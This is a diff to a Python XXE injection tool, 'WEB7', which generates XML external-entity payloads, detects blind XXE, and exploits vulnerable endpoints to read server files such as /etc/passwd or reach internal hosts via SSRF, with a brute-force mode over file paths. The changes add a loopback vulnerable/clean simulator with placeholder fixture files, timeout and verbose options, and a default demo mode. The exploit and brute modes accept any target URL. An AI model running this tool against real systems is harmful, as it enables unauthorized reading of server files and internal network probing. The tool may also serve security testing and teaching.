@@ -1,16 +1,22 @@
 #!/usr/bin/env python3
 """WEB7 — XXE Injection Tool.
 
-XXE payload generation, blind XXE detection, file read via SSRF,
+XXE payload generation, blind XXE detection, file read via external entity,
 and error-based exfiltration using only standard-library modules.
+
+Transport is stdlib urllib. `--demo` runs the full detection engine against a
+built-in vulnerable XML parser simulator (and a clean control) over loopback,
+exercising the same HTTP code path as a live target.
 """
 
+import argparse
 import re
 import sys
+import threading
 import urllib.request
 import urllib.parse
 import urllib.error
-import xml.etree.ElementTree as ET
+from http.server import HTTPServer, BaseHTTPRequestHandler
 from typing import Optional
 
 
@@ -105,6 +111,132 @@ class XXEPayloadGenerator:
         return payload
 
 
+# ---------------------------------------------------------------------------
+# Built-in XML simulators (importable so tests host them on loopback)
+# ---------------------------------------------------------------------------
+
+# Fixture file contents served by the vulnerable simulator when an external
+# entity references a file:// URI.  Uses reserved placeholders only.
+XXE_FIXTURES = {
+    "/etc/passwd": (
+        "root:x:0:0:root:/root:/bin/bash\n"
+        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
+        "labuser:x:1000:1000:Lab User:/home/labuser:/bin/bash\n"
+    ),
+    "/etc/hostname": "lab-target-01\n",
+    "/etc/hosts": "127.0.0.1 localhost\n",
+}
+
+XXE_ERROR_INDICATORS = [
+    "XML parsing error",
+    "entity reference",
+]
+
+
+def _resolve_xxe_entities(document: str, fixtures: Optional[dict] = None):
+    """Lenient entity expansion used by the *vulnerable* simulator only.
+
+    Mirrors a misconfigured XML parser that loads SYSTEM entities and
+    inlines their content into the response.
+    """
+    fixtures = fixtures or XXE_FIXTURES
+    entities = []
+    for m in re.finditer(r'<!ENTITY\s+(\w+)\s+(SYSTEM\s+)?"([^"]*)"', document):
+        name, is_system, value = m.group(1), m.group(2), m.group(3)
+        entities.append((name, bool(is_system), value))
+
+    out = document
+    for name, is_system, value in entities:
+        if is_system:
+            path = None
+            if value.startswith("file://"):
+                path = value[len("file://"):]
+            elif value.startswith("/"):
+                path = value
+            if path is not None and path in fixtures:
+                out = out.replace("&%s;" % name, fixtures[path])
+            elif path is not None:
+                return None, name, value
+            else:
+                out = out.replace("&%s;" % name, "<ssrf:%s>" % value)
+        else:
+            out = out.replace("&%s;" % name, value)
+    return out, None, None
+
+
+class VulnXMLHandler(BaseHTTPRequestHandler):
+    """Simulates an XML endpoint with external-entity processing enabled."""
+
+    fixtures = XXE_FIXTURES
+
+    def do_GET(self):
+        parsed = urllib.parse.urlparse(self.path)
+        params = urllib.parse.parse_qs(parsed.query)
+        document = params.get("xml", [""])[0]
+        self._process(document)
+
+    def do_POST(self):
+        length = int(self.headers.get("Content-Length", 0))
+        document = self.rfile.read(length).decode("utf-8", errors="replace")
+        self._process(document)
+
+    def _process(self, document):
+        resolved, missing_name, missing_uri = _resolve_xxe_entities(document, self.fixtures)
+        if missing_name is not None:
+            self.send_response(500)
+            self.send_header("Content-Type", "text/html")
+            self.end_headers()
+            body = (
+                "<html><body><h1>XML parsing error</h1>"
+                "<p>entity reference '%s' failed to load %s</p>"
+                "</body></html>" % (missing_name, missing_uri)
+            )
+            self.wfile.write(body.encode())
+            return
+        self.send_response(200)
+        self.send_header("Content-Type", "text/xml")
+        self.end_headers()
+        self.wfile.write(resolved.encode())
+
+    log_message = lambda self, fmt, *args: None  # noqa: E731
+
+
+class CleanXMLHandler(BaseHTTPRequestHandler):
+    """Control server: refuses DOCTYPE declarations, never expands entities."""
+
+    def do_GET(self):
+        parsed = urllib.parse.urlparse(self.path)
+        params = urllib.parse.parse_qs(parsed.query)
+        document = params.get("xml", [""])[0]
+        self._process(document)
+
+    def do_POST(self):
+        length = int(self.headers.get("Content-Length", 0))
+        document = self.rfile.read(length).decode("utf-8", errors="replace")
+        self._process(document)
+
+    def _process(self, document):
+        if "<!DOCTYPE" in document.upper():
+            self.send_response(400)
+            self.send_header("Content-Type", "text/html")
+            self.end_headers()
+            self.wfile.write(
+                b"<html><body><h1>400 Missing XML declaration</h1>"
+                b"<p>DOCTYPE declarations are not allowed</p></body></html>"
+            )
+            return
+        self.send_response(200)
+        self.send_header("Content-Type", "text/xml")
+        self.end_headers()
+        self.wfile.write(b"<ok/>")
+
+    log_message = lambda self, fmt, *args: None  # noqa: E731
+
+
+# ---------------------------------------------------------------------------
+# Detector
+# ---------------------------------------------------------------------------
+
 class BlindXXEDetector:
     """Detect blind XXE via error-based and OOB techniques."""
 
@@ -131,11 +263,14 @@ class BlindXXEDetector:
     ]
 
     def __init__(self, target_url: str, method: str = "POST",
-                 param: str = "xml", headers: Optional[dict] = None):
+                 param: str = "xml", headers: Optional[dict] = None,
+                 timeout: int = 10, verbose: bool = False):
         self.target_url = target_url
         self.method = method.upper()
         self.param = param
         self.headers = headers or {"Content-Type": "application/xml"}
+        self.timeout = timeout
+        self.verbose = verbose
 
     def _send(self, payload: str) -> tuple:
         """Send payload and return (status, body, headers)."""
@@ -149,8 +284,11 @@ class BlindXXEDetector:
         for k, v in self.headers.items():
             req.add_header(k, v)
 
+        if self.verbose:
+            print(f"      > POST {self.target_url} ({len(payload)} bytes)")
+
         try:
-            resp = urllib.request.urlopen(req, timeout=10)
+            resp = urllib.request.urlopen(req, timeout=self.timeout)
             body = resp.read().decode("utf-8", errors="replace")
             return resp.status, body, dict(resp.headers)
         except urllib.error.HTTPError as e:
@@ -203,6 +341,8 @@ class BlindXXEDetector:
         elif re.search(windows_hosts, body):
             result["file_read_possible"] = True
             result["leaked_content"] = "Windows hosts file pattern found"
+        if self.verbose:
+            print(f"      File read via {file_path}: {result['file_read_possible']}")
         return result
 
     def error_based_exfil(self) -> dict:
@@ -228,18 +368,30 @@ class BlindXXEDetector:
         results["xml_parsing"] = self.detect_xml_parsing()
         results["file_read"] = self.test_file_read(file_path)
         results["error_based"] = self.error_based_exfil()
+        if self.verbose:
+            print(f"    xxe_detected: {self.is_vulnerable(results)}")
         return results
+
+    @staticmethod
+    def is_vulnerable(results: dict) -> bool:
+        file_read = results.get("file_read", {}).get("file_read_possible", False)
+        error_based = results.get("error_based", {}).get("error_based_detected", False)
+        expansion = results.get("xml_parsing", {}).get("entity_expansion", False)
+        return bool(file_read or error_based or expansion)
 
 
 class XXEExploiter:
     """Exploit known-XXE endpoints to read files or SSRF."""
 
     def __init__(self, target_url: str, method: str = "POST",
-                 param: str = "xml", headers: Optional[dict] = None):
+                 param: str = "xml", headers: Optional[dict] = None,
+                 timeout: int = 10, verbose: bool = False):
         self.target_url = target_url
         self.method = method.upper()
         self.param = param
         self.headers = headers or {"Content-Type": "application/xml"}
+        self.timeout = timeout
+        self.verbose = verbose
 
     def _send(self, payload: str) -> tuple:
         if self.method == "GET":
@@ -253,7 +405,7 @@ class XXEExploiter:
             req.add_header(k, v)
 
         try:
-            resp = urllib.request.urlopen(req, timeout=10)
+            resp = urllib.request.urlopen(req, timeout=self.timeout)
             body = resp.read().decode("utf-8", errors="replace")
             return resp.status, body, dict(resp.headers)
         except urllib.error.HTTPError as e:
@@ -290,7 +442,7 @@ class XXEExploiter:
         for k, v in headers.items():
             req.add_header(k, v)
         try:
-            resp = urllib.request.urlopen(req, timeout=10)
+            resp = urllib.request.urlopen(req, timeout=self.timeout)
             body = resp.read().decode("utf-8", errors="replace")
             return {"status": resp.status, "path": file_path, "content": body}
         except urllib.error.HTTPError as e:
@@ -332,9 +484,12 @@ class XXEBruteForcer:
     ]
 
     def __init__(self, target_url: str, method: str = "POST",
-                 param: str = "xml", headers: Optional[dict] = None):
-        self.detector = BlindXXEDetector(target_url, method, param, headers)
-        self.exploiter = XXEExploiter(target_url, method, param, headers)
+                 param: str = "xml", headers: Optional[dict] = None,
+                 timeout: int = 10, verbose: bool = False):
+        self.detector = BlindXXEDetector(target_url, method, param, headers,
+                                          timeout=timeout, verbose=verbose)
+        self.exploiter = XXEExploiter(target_url, method, param, headers,
+                                      timeout=timeout, verbose=verbose)
 
     def brute_files(self) -> list:
         results = []
@@ -359,28 +514,108 @@ class XXEBruteForcer:
         return results
 
 
+# ---------------------------------------------------------------------------
+# Demo
+# ---------------------------------------------------------------------------
+
+def run_demo(vulnerable: bool = True, clean: bool = False, verbose: bool = False):
+    """Offline demo: run the full detection engine against a built-in simulator.
+
+    `vulnerable` selects the entity-expanding parser, `clean` selects the
+    hardened control. Both are served over loopback and hit through the exact
+    same urllib HTTP code path as a live remote target.
+    """
+    Handler = CleanXMLHandler if (clean or not vulnerable) else VulnXMLHandler
+    server = HTTPServer(("127.0.0.1", 0), Handler)
+    port = server.server_address[1]
+    thread = threading.Thread(target=server.serve_forever, daemon=True)
+    thread.start()
+
+    label = ("CLEAN control (rejects DOCTYPE/entities)"
+             if (clean or not vulnerable)
+             else "VULNERABLE (expands external entities)")
+    print("  +------------------------------------------+")
+    print("  |        WEB7 -- XXE Injection Tool         |")
+    print("  +------------------------------------------+")
+    print(f"[*] DEMO MODE: XML simulator ({label}) on http://127.0.0.1:{port}")
+    print("[*] The engine posts XML through urllib and inspects responses.")
+    print()
+
+    url = f"http://127.0.0.1:{port}/parse"
+    detector = BlindXXEDetector(url, method="POST", param="xml",
+                                timeout=5, verbose=verbose)
+    print("[*] Running detection scan (parsing, file read, error-based)...")
+    results = detector.full_scan("/etc/passwd")
+
+    print("\n  Detection results:")
+    for section, data in results.items():
+        print(f"    [{section}]")
+        for k, v in data.items():
+            print(f"      {k}: {v}")
+
+    found = BlindXXEDetector.is_vulnerable(results)
+    server.shutdown()
+
+    print()
+
+    if found and (not clean and vulnerable):
+        # confirm file read content is the planted fixture
+        leak = results.get("file_read", {}).get("leaked_content", "")
+        if leak:
+            print("[+] File content leaked via external entity:")
+            print(f"    {leak[:80]}")
+        print("[+] Demo: XXE detected on vulnerable simulator (expected behavior).")
+        print("[+] Exit 0 -- scanner works correctly.")
+        return 0
+    if (clean or not vulnerable) and not found:
+        print("[+] Demo: clean control produced zero XXE findings (no false positive).")
+        print("[+] Exit 0 -- scanner works correctly.")
+        return 0
+    print("[-] Demo: unexpected result -- scanner may need tuning.")
+    return 1
+
+
+def demo():
+    """Run both simulator demos in sequence."""
+    rc = run_demo(vulnerable=True, clean=False)
+    if rc == 0:
+        print()
+        rc = run_demo(vulnerable=True, clean=True)
+    sys.exit(rc)
+
+
 def main():
     """CLI entry point for quick testing."""
-    import argparse
-
     parser = argparse.ArgumentParser(
         description="WEB7 — XXE Injection Tool",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog=(
             "Examples:\n"
             "  python3 xxe_tool.py --mode generate --file /etc/passwd\n"
-            "  python3 xxe_tool.py --mode detect --url http://target/xml\n"
-            "  python3 xxe_tool.py --mode exploit --url http://target/xml "
+            "  python3 xxe_tool.py --mode detect --url http://127.0.0.1:8080/xml\n"
+            "  python3 xxe_tool.py --mode exploit --url http://127.0.0.1:8080/xml "
             "--file /etc/passwd\n"
+            "  python3 xxe_tool.py --demo\n"
+            "  python3 xxe_tool.py                 # equivalent to --demo\n"
         ),
     )
     parser.add_argument("--mode", choices=["generate", "detect", "exploit", "brute"],
-                        default="generate")
+                        default=None)
     parser.add_argument("--url", help="Target URL for detect/exploit/brute modes")
     parser.add_argument("--file", default="/etc/passwd", help="File path to read")
     parser.add_argument("--method", default="POST", help="HTTP method (GET/POST)")
     parser.add_argument("--param", default="xml", help="Parameter name")
+    parser.add_argument("--timeout", type=int, default=10,
+                        help="HTTP request timeout in seconds (default: 10)")
+    parser.add_argument("-v", "--verbose", action="store_true",
+                        help="Verbose request logging and scan details")
+    parser.add_argument("--demo", action="store_true",
+                        help="Run offline demo against built-in vulnerable/clean simulators")
     args = parser.parse_args()
+
+    if args.demo or args.mode is None:
+        demo()
+        return
 
     if args.mode == "generate":
         print("=== XXE Payload Generator ===\n")
@@ -402,20 +637,26 @@ def main():
             print("Error: --url required for detect mode")
             sys.exit(1)
         print(f"=== Blind XXE Detection: {args.url} ===\n")
-        detector = BlindXXEDetector(args.url, args.method, args.param)
+        detector = BlindXXEDetector(args.url, args.method, args.param,
+                                    timeout=args.timeout, verbose=args.verbose)
         results = detector.full_scan(args.file)
         for section, data in results.items():
             print(f"[{section}]")
             for k, v in data.items():
                 print(f"  {k}: {v}")
             print()
+        if BlindXXEDetector.is_vulnerable(results):
+            print("[-] VULNERABLE: XXE indicators detected.")
+        else:
+            print("[+] No XXE indicators detected.")
 
     elif args.mode == "exploit":
         if not args.url:
             print("Error: --url required for exploit mode")
             sys.exit(1)
         print(f"=== XXE Exploitation: {args.url} ===\n")
-        exploiter = XXEExploiter(args.url, args.method, args.param)
+        exploiter = XXEExploiter(args.url, args.method, args.param,
+                                 timeout=args.timeout, verbose=args.verbose)
         result = exploiter.read_file(args.file)
         print(f"Status: {result['status']}")
         print(f"Path:   {result['path']}")
@@ -426,7 +667,8 @@ def main():
             print("Error: --url required for brute mode")
             sys.exit(1)
         print(f"=== XXE Brute Force: {args.url} ===\n")
-        bf = XXEBruteForcer(args.url, args.method, args.param)
+        bf = XXEBruteForcer(args.url, args.method, args.param,
+                            timeout=args.timeout, verbose=args.verbose)
         results = bf.brute_files()
         for r in results:
             marker = "[+] HIT" if r["interesting"] else "[-] miss"
